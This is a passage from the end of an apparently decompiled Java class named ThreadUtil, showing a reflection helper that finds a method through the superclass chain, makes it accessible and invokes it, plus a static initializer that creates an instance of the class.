                    method = tempClass.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException var11) {
                tempClass = tempClass.getSuperclass();
            }
        }

        if (method == null) {
            throw new NoSuchMethodException(methodName);
        } else {
            method.setAccessible(true);
            if (obj instanceof Class) {
                try {
                    return method.invoke((Object)null, param);
                } catch (IllegalAccessException var9) {
                    throw new RuntimeException(var9.getMessage());
                }
            } else {
                try {
                    return method.invoke(obj, param);
                } catch (IllegalAccessException var10) {
                    throw new RuntimeException(var10.getMessage());
                }
            }
        }
    }

    static {
        new ThreadUtil();
    }
}
